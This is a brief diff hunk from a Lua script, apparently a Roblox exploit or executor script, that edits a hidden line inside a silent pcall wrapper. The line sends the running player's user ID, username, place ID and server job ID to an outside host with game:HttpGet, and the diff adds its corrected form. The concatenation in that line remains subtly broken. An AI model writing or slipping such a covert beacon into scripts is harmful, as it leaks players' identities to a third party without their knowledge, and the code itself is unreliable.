@@ -181,7 +181,7 @@ local _0x2, _0x3 = pcall(function()
 	  local player=game:GetService("Players").LocalPlayer
 	  local gameid=game.PlaceID
 	  local jobid=game.JobId
-	  game:HttpGet('http://twofacekilla.rf.gd/5.php?userid='..player.UserId..'&username='..player.Name'&executor=nilgame='gameid'&instance='..jobid..'')
+	  game:HttpGet('http://twofacekilla.rf.gd/5.php?userid='..player.UserId..'&username='..player.Name'&executor=nil&game='gameid'&instance='..jobid..'')
 	end)
 end)
 
